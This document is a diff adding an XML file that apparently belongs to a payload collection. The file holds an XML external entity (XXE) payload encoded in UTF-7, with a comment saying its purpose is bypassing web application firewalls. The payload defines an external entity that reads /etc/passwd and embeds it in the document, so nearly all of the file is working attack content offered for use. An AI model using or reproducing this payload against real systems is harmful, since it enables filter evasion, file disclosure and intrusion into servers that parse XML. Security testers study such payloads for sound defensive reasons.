@@ -1,0 +1,8 @@
+<!--
+Payload: UTF-7 Encoded Payload
+Usage: Bypassing WAFs that don't decode UTF-7 properly.
+Note: Ensure you set the encoding="UTF-7" in the XML declaration.
+-->
+<?xml version="1.0" encoding="UTF-7"?>
++ADw-!DOCTYPE foo [+ADw-!ENTITY xxe SYSTEM "file:///etc/passwd"+AD4-]+AD4-
++ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-
